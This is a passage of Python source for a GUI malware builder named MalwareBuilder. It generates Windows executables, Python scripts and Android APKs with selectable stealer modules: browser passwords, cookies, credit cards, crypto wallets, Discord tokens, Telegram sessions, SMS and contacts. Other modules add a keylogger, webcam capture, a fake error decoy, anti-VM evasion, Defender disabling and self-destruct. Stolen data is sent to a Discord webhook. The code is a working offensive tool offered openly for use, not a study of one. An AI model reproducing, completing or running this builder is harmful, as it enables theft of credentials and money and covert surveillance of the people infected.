        self.grid_frame = ctk.CTkFrame(cb_section, fg_color="transparent")
        self.grid_frame.pack(padx=12, pady=(4, 8))
        self.checkbox_widgets = {}
        row, col = 0, 0
        for opt in self.all_options:
            cb = ctk.CTkCheckBox(self.grid_frame, text=opt, variable=self.cb_vars[opt], 
                                  onvalue="on", offvalue="off",
                                  fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                                  border_color=COLORS["entry_bg"], text_color=COLORS["text"],
                                  font=("Segoe UI", 11), corner_radius=4)
            cb.grid(row=row, column=col, sticky="w", padx=8, pady=4)
            self.checkbox_widgets[opt] = cb
            col += 1
            if col > 3:
                col = 0
                row += 1

        fake_frame = ctk.CTkFrame(cb_section, fg_color=COLORS["entry_bg"], corner_radius=8)
        fake_frame.pack(fill="x", padx=16, pady=(4, 12))
        ctk.CTkLabel(fake_frame, text="Fake Error:", font=("Segoe UI", 11, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=(12, 6), pady=8)
        ctk.CTkEntry(fake_frame, textvariable=self.fake_error_title, width=130,
                      fg_color=COLORS["frame_bg"], border_color=COLORS["accent"],
                      font=("Segoe UI", 11)).pack(side="left", padx=3, pady=6)
        ctk.CTkEntry(fake_frame, textvariable=self.fake_error_msg, width=280,
                      fg_color=COLORS["frame_bg"], border_color=COLORS["accent"],
                      font=("Segoe UI", 11)).pack(side="left", padx=3, pady=6)

        build_row = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        build_row.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkLabel(build_row, text="Format:", font=("Segoe UI", 12),
                     text_color=COLORS["text"]).pack(side="left", padx=(14, 4), pady=10)
        self.fmt_menu = ctk.CTkOptionMenu(build_row, variable=self.format_var, 
                           values=[".exe", ".py", ".apk"],
                           fg_color=COLORS["accent"], button_color=COLORS["accent_hover"],
                           width=70, font=("Segoe UI", 11), command=self.on_format_change)
        self.fmt_menu.pack(side="left", padx=2, pady=10)
        ctk.CTkLabel(build_row, text="Name:", font=("Segoe UI", 12),
                     text_color=COLORS["text"]).pack(side="left", padx=(16, 4))
        ctk.CTkEntry(build_row, textvariable=self.filename_var, width=145,
                      fg_color=COLORS["entry_bg"], border_color=COLORS["accent"],
                      font=("Consolas", 11)).pack(side="left", padx=2, pady=10)
        self.icon_btn = ctk.CTkButton(build_row, text="🎨 Icon", command=self.choose_icon,
                                       fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                                       width=75, corner_radius=6, font=("Segoe UI", 11))
        self.icon_btn.pack(side="left", padx=(12, 4))
        self.icon_label = ctk.CTkLabel(build_row, text="No icon", font=("Segoe UI", 10),
                                        text_color=COLORS["text_dim"])
        self.icon_label.pack(side="left", padx=2)

        ctk.CTkButton(build_row, text="⚡ BUILD", command=self.build_payload,
                       fg_color=COLORS["success"], hover_color="#1e8449",
                       font=("Segoe UI", 15, "bold"), width=120, height=38,
                       corner_radius=8).pack(side="right", padx=18, pady=8)

        self.on_format_change(self.format_var.get())

        console_frame = ctk.CTkFrame(self.root, fg_color=COLORS["console_bg"], corner_radius=10)
        console_frame.pack(fill="both", expand=True, padx=16, pady=(0, 14))
        ctk.CTkLabel(console_frame, text="📟 Build Console", font=("Consolas", 11, "bold"),
                     text_color=COLORS["accent_glow"]).pack(anchor="w", padx=14, pady=(8, 2))
        self.console_text = tk.Text(console_frame, bg=COLORS["console_bg"], fg=COLORS["text"],
                                     insertbackground=COLORS["accent"], font=("Consolas", 10),
                                     relief="flat", borderwidth=0, padx=12, pady=8,
                                     state="disabled", wrap="word", height=8)
        self.console_text.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        scrollbar = ctk.CTkScrollbar(console_frame, command=self.console_text.yview)
        scrollbar.pack(side="right", fill="y", padx=(0, 8), pady=(0, 10))
        self.console_text.configure(yscrollcommand=scrollbar.set)

        self.log("v8.0 READY — APK + EXE + PY builder | 15 browsers, Android support", "info")
        self.log("Tip: Ctrl+B to build. Select .apk for Android payloads.", "info")

    def on_format_change(self, choice):
        """Enable/disable features based on selected format."""
        windows_only = [
            "Telegram Sessions", "Extensions", "Wallets", "Roblox Cookies",
            "Credit Cards", "Passwords", "Cookies", "Browser History",
            "Downloads", "Search History", "Discord Tokens", "Passkeys / WebAuthn",
            "Disable Defender", "Add Exclusion", "Authenticator", "Games",
            "Anti-VM/Debug", "Anti-Spam",
        ]
        android_only = [
            "Contacts", "SMS", "Call Logs", "Installed Apps", "WiFi Info",
            "Camera", "Files", "Persistence",
        ]
        
        if choice == ".apk":
            for opt in windows_only:
                if opt in self.checkbox_widgets:
                    self.checkbox_widgets[opt].configure(state="disabled", fg_color=COLORS["entry_bg"])
                    self.cb_vars[opt].set("off")
            for opt in android_only:
                if opt in self.checkbox_widgets:
                    self.checkbox_widgets[opt].configure(state="normal", fg_color=COLORS["accent"])
            self.icon_btn.configure(state="disabled", fg_color=COLORS["entry_bg"])
            self.icon_label.configure(text="(icon for .exe only)")
            self.log("📱 Android APK mode — Android-specific features enabled", "info")
        else:
            for opt in windows_only:
                if opt in self.checkbox_widgets:
                    self.checkbox_widgets[opt].configure(state="normal", fg_color=COLORS["accent"])
            for opt in android_only:
                if opt in self.checkbox_widgets:
                    self.checkbox_widgets[opt].configure(state="disabled", fg_color=COLORS["entry_bg"])
                    self.cb_vars[opt].set("off")
            if choice == ".py":
                self.icon_btn.configure(state="disabled", fg_color=COLORS["entry_bg"])
                self.icon_label.configure(text="(icon for .exe only)")
            else:
                self.icon_btn.configure(state="normal", fg_color=COLORS["accent"])
                self.icon_label.configure(text=os.path.basename(self.icon_path) if self.icon_path else "No icon")

    def on_ping_toggle(self):
        if self.ping_var.get() == "on":
            self.ping_type_menu.configure(state="normal")
        else:
            self.ping_type_menu.configure(state="disabled")

    def select_all(self):
        fmt = self.format_var.get()
        for opt, var in self.cb_vars.items():
            if fmt == ".apk":
                if opt not in ["Telegram Sessions", "Extensions", "Roblox Cookies", 
                               "Credit Cards", "Passkeys / WebAuthn", "Disable Defender",
                               "Add Exclusion", "Startup", "Anti-VM/Debug", "Anti-Spam",
                               "Games", "Wallets", "Common Files", "Webcam"]:
                    var.set("on")
                else:
                    var.set("off")
            else:
                if opt not in ["Contacts", "SMS", "Call Logs", "Installed Apps", "Files", "Persistence"]:
                    var.set("on")
                else:
                    var.set("off")
        self.log("All available features selected.", "info")

    def deselect_all(self):
        for var in self.cb_vars.values():
            var.set("off")
        self.log("All features deselected.", "info")

    def select_stealers(self):
        stealer_keys = [
            "System Info", "Telegram Sessions", "Extensions", "Wallets",
            "Roblox Cookies", "Credit Cards", "Passwords", "Cookies",
            "Browser History", "Downloads", "Search History", "Discord Tokens",
            "Passkeys / WebAuthn", "Webcam", "Screenshot", "Keylogger",
            "Authenticator", "WiFi Passwords", "Clipboard", "Common Files",
            "Games", "Contacts", "SMS", "Call Logs", "Location", "Files",
        ]
        for k, v in self.cb_vars.items():
            v.set("on" if k in stealer_keys else "off")
        self.log("Stealer features selected.", "info")

    def paste_webhook(self):
        try:
            clip = self.root.clipboard_get()
            if clip.strip():
                self.webhook_var.set(clip.strip())
                self.log("Webhook pasted from clipboard.", "info")
        except:
            self.log("Could not paste from clipboard.", "warn")

    def choose_icon(self):
        path = filedialog.askopenfilename(
            title="Choose Icon",
            filetypes=[("Icon files", "*.ico *.png *.jpg *.jpeg"), ("All files", "*.*")]
        )
        if path:
            self.icon_path = path
            self.icon_label.configure(text=os.path.basename(path))
            self.log(f"Icon selected: {os.path.basename(path)}", "info")

    def test_webhook_action(self):
        url = self.webhook_var.get().strip()
        if not url:
            self.log("No webhook URL entered.", "error")
            messagebox.showerror("Error", "Enter a webhook URL first.")
            return
        self.log(f"Testing webhook: {url[:60]}...", "info")
        ok, msg = test_webhook(url)
        if ok:
            self.log(msg, "success")
            messagebox.showinfo("Webhook Test", msg)
        else:
            self.log(msg, "error")
            messagebox.showerror("Webhook Test", msg)

    def build_payload(self):
        webhook = self.webhook_var.get().strip()
        if not webhook:
            self.log("ERROR: No webhook URL provided.", "error")
            messagebox.showerror("Error", "Enter a Discord webhook URL.")
            return
        name = self.filename_var.get().strip()
        if not name:
            self.log("ERROR: No filename provided.", "error")
            messagebox.showerror("Error", "Enter a filename.")
            return
        fmt = self.format_var.get()

        self.log("=" * 50, "")
        self.log(f"BUILD STARTED — {name}{fmt}", "info")
        self.log(f"Webhook: {webhook[:55]}...", "info")

        if fmt == ".apk":
            self._build_apk(webhook, name)
            return
        
        self.log("Adding output folders to Defender exclusions...", "info")
        add_self_exclusion()
        self.log("Output folders excluded from Defender.", "success")

        if fmt == ".exe":
            ok, info = check_pyinstaller()
            if not ok:
                self.log(f"PyInstaller not found: {info}", "error")
                messagebox.showerror("PyInstaller Missing",
                    f"Cannot build .exe:\n{info}\n\nInstall: pip install pyinstaller")
                return
            self.log(f"PyInstaller: {info}", "info")

        mapping = {
            "System Info": "system_info", "Telegram Sessions": "telegram",
            "Extensions": "extensions", "Wallets": "wallets",
            "Roblox Cookies": "roblox", "Credit Cards": "credit_cards",
            "Passwords": "passwords", "Cookies": "cookies",
            "Browser History": "history", "Downloads": "downloads",
            "Search History": "search", "Discord Tokens": "discord",
            "Passkeys / WebAuthn": "passkeys",
            "Webcam": "webcam", "Screenshot": "screenshot",
            "Keylogger": "keylogger_scraper", "Fake Error": "fake_error",
            "Disable Defender": "disable_defender", "Add Exclusion": "add_exclusion",
            "Startup": "startup", "Authenticator": "authenticator",
            "WiFi Passwords": "wifi", "Clipboard": "clipboard",
            "Common Files": "common_files", "Games": "games",
            "Anti-VM/Debug": "anti_vm", "Self-Destruct": "self_destruct",
            "Anti-Spam": "anti_spam"
        }

        replacements = {"webhook": webhook}
        selected_functions = []
        has_keylogger = False
        has_anti_vm = False
        has_self_destruct = False
        has_anti_spam = False
        enabled_count = 0

        import random as rand_mod, string as str_mod
        mutex_name = "".join(rand_mod.choices(str_mod.ascii_letters + str_mod.digits, k=16))
        replacements["mutex_name"] = mutex_name

        if self.ping_var.get() == "on":
            replacements["ping_type"] = self.ping_type_var.get()
            self.log(f"  ✓ Ping: @{self.ping_type_var.get()}", "success")
        else:
            replacements["ping_type"] = "None"

        for label, key in mapping.items():
            if self.cb_vars[label].get() == "on":
                enabled_count += 1
                snippet = SNIPPETS[key]
                if key == "fake_error":
                    safe_title = self.fake_error_title.get().replace('\\', '\\\\').replace('"', '\\"')
                    safe_msg = self.fake_error_msg.get().replace('\\', '\\\\').replace('"', '\\"')
                    snippet = snippet.replace("{title}", safe_title)
                    snippet = snippet.replace("{message}", safe_msg)
                if key == "keylogger_scraper":
                    has_keylogger = True
                if key == "anti_vm":
                    has_anti_vm = True
                if key == "self_destruct":
                    has_self_destruct = True
                if key == "anti_spam":
                    has_anti_spam = True
                replacements[key] = textwrap.indent(snippet, '    ')
                fn_name = snippet.strip().split("def ")[1].split("(")[0]
                if key == "keylogger_scraper":
                    selected_functions.append("save_keylogger_results")
                elif key in ("anti_vm", "self_destruct", "anti_spam"):
                    pass
                else:
                    selected_functions.append(fn_name)
                self.log(f"  ✓ {label}", "success")
            else:
                replacements[key] = "    pass"

        if enabled_count == 0:
            self.log("WARNING: No features selected.", "warn")

        replacements["anti_vm_check"] = "check_anti_vm_debug()" if has_anti_vm else "pass  # anti-vm disabled"
        replacements["anti_spam_check"] = "check_anti_spam_mutex()" if has_anti_spam else "pass  # anti-spam disabled"
        replacements["self_destruct_call"] = "self_destruct()" if has_self_destruct else "pass  # self-destruct disabled"
        
        scraper_list_lines = "\n".join(f"    scrapers.append({fn})" for fn in selected_functions)
        replacements["scraper_list"] = scraper_list_lines

        if has_keylogger:
            replacements["start_keylogger"] = "    keylogger_thread = Thread(target=keylogger_background, daemon=True); keylogger_thread.start()"
            replacements["stop_keylogger"] = "    KEYLOGGER_STOP.set()\n    if keylogger_thread: keylogger_thread.join(timeout=2)"
        else:
            replacements["start_keylogger"] = "    pass"
            replacements["stop_keylogger"] = "    pass"

        self.log("Generating payload code...", "info")
        payload_code = PAYLOAD_TEMPLATE.safe_substitute(replacements)

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        py_path = os.path.join(OUTPUT_DIR, f"{name}.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(payload_code)

        self.log("Validating payload syntax...", "info")
        ok, msg = validate_payload_code(py_path)
        if not ok:
            self.log(f"SYNTAX ERROR:", "error")
            self.log(f"  {msg}", "error")
            self.log(f"Payload .py kept for debugging: {py_path}", "warn")
            messagebox.showerror("Syntax Error",
                f"The generated payload has a syntax error:\n\n{msg}\n\n"
                f"The .py file has been kept at:\n{py_path}")
            return
        self.log(f"Payload syntax: {msg}", "success")

        if fmt == ".exe":
            exe_path = os.path.join(OUTPUT_DIR, f"{name}.exe")
            work_dir = os.path.join(OUTPUT_DIR, "_build_temp")
            os.makedirs(work_dir, exist_ok=True)

            icon_flag = []
            temp_ico = None
            if self.icon_path:
                ico = icon_to_ico(self.icon_path)
                if ico:
                    temp_ico = os.path.abspath(ico)
                    icon_flag = ["--icon", temp_ico]
                    self.log(f"Icon applied: {os.path.basename(ico)}", "info")
                else:
                    self.log("Icon conversion failed.", "warn")

            self.log("Running PyInstaller (60-180s)...", "info")
            self.root.update_idletasks()

            try:
                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile", "--noconsole", "--uac-admin",
                    "--distpath", os.path.abspath(OUTPUT_DIR),
                    "--workpath", os.path.abspath(work_dir),
                    "--specpath", os.path.abspath(work_dir),
                    "--name", name,
                    "--collect-all", "requests",
                    "--collect-all", "urllib3",
                    "--collect-all", "chardet",
                    "--collect-all", "certifi",
                    "--collect-all", "idna",
                ] + icon_flag
                for dep in PAYLOAD_DEPS:
                    cmd.extend(["--hidden-import", dep])
                cmd.append(os.path.abspath(py_path))

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
                if result.returncode != 0:
                    err = (result.stderr or result.stdout or "Unknown error")[-700:]
                    self.log(f"PyInstaller FAILED (code {result.returncode})", "error")
                    self.log(f"  {err[:400]}", "error")
                    shutil.rmtree(work_dir, ignore_errors=True)
                    messagebox.showerror("Build Failed",
                        f"PyInstaller error (code {result.returncode}):\n\n{err}\n\n.py kept at:\n{py_path}")
                    return

                if not os.path.exists(exe_path):
                    self.log("PyInstaller ran but no .exe produced.", "error")
                    shutil.rmtree(work_dir, ignore_errors=True)
                    messagebox.showerror("Build Failed",
                        f"PyInstaller ran but no .exe produced.\n.py kept at:\n{py_path}")
                    return

                shutil.rmtree(work_dir, ignore_errors=True)
                if temp_ico and os.path.exists(temp_ico):
                    os.remove(temp_ico)
                os.remove(py_path)

                exe_size = os.path.getsize(exe_path)
                size_str = f"{exe_size:,}B" if exe_size < 1024 else f"{exe_size/1024:.1f}KB" if exe_size < 1048576 else f"{exe_size/1048576:.1f}MB"
                self.log(f"BUILD SUCCESS! {exe_path} ({size_str})", "success")
                self.log(f"Features: {enabled_count} | Keylogger: {'Yes' if has_keylogger else 'No'} | Anti-VM: {'Yes' if has_anti_vm else 'No'} | Self-Destruct: {'Yes' if has_self_destruct else 'No'}", "info")
                messagebox.showinfo("Built! ⚡",
                    f"v8.0 .exe ready:\n{exe_path}\n\n"
                    f"Size: {size_str}\nFeatures: {enabled_count}\n"
                    f"Keylogger: {'Yes' if has_keylogger else 'No'}\n"
                    f"Anti-VM: {'Yes' if has_anti_vm else 'No'}\n"
                    f"Self-Destruct: {'Yes' if has_self_destruct else 'No'}")
            except subprocess.TimeoutExpired:
                self.log("PyInstaller timed out (240s).", "error")
                shutil.rmtree(work_dir, ignore_errors=True)
                messagebox.showerror("Timeout", f"PyInstaller timed out.\n.py kept at:\n{py_path}")
            except Exception as e:
                self.log(f"Unexpected error: {e}", "error")
                shutil.rmtree(work_dir, ignore_errors=True)
                messagebox.showerror("Error", f"Unexpected: {e}\n\n.py kept at:\n{py_path}")
        else:
            self.log(f"BUILD SUCCESS! {py_path}", "success")
            self.log(f"Features: {enabled_count} | Keylogger: {'Yes' if has_keylogger else 'No'}", "info")
            messagebox.showinfo("Built! ⚡",
                f".py payload ready:\n{py_path}\n\n"
                f"Features: {enabled_count}\n"
                f"Run with: python {name}.py")

    def _build_apk(self, webhook, name):
        """Build Android APK payload using direct SDK toolchain."""
        self.log("Starting Android APK build with direct SDK toolchain...", "info")
        
        features = {}
        enabled_count = 0
        for opt in self.all_options:
            val = self.cb_vars[opt].get()
            features[opt] = val
            if val == "on":
                enabled_count += 1
                self.log(f"  ✓ {opt}", "success")
        
        if enabled_count == 0:
            self.log("WARNING: No features selected.", "warn")
        
        ping_type = ""
        if self.ping_var.get() == "on":
            ping_type = self.ping_type_var.get()
        
        fake_error_title = self.fake_error_title.get()
        fake_error_msg = self.fake_error_msg.get()
        
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        builder = AndroidAPKBuilder(self.log)
        success, result = builder.generate_apk(
            webhook, name, features, ping_type,
            fake_error_title, fake_error_msg
        )
        
        if success:
            if result.endswith(".apk"):
                self.log(f"BUILD SUCCESS! Signed APK ready: {result}", "success")
                self.log(f"Features: {enabled_count}", "info")
                self.log(f"APK size: {os.path.getsize(result):,} bytes", "info")
                messagebox.showinfo("Built! ⚡",
                    f"APK ready:\n{result}\n\n"
                    f"Features: {enabled_count}\n\n"
                    f"Install with: adb install {os.path.basename(result)}")
            else:
                self.log(f"BUILD SUCCESS! {result}", "success")
                self.log(f"Features: {enabled_count}", "info")
        else:
            self.log(f"BUILD FAILED: {result}", "error")
            messagebox.showerror("Build Failed", f"APK build failed:\n{result}")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    MalwareBuilder().run()
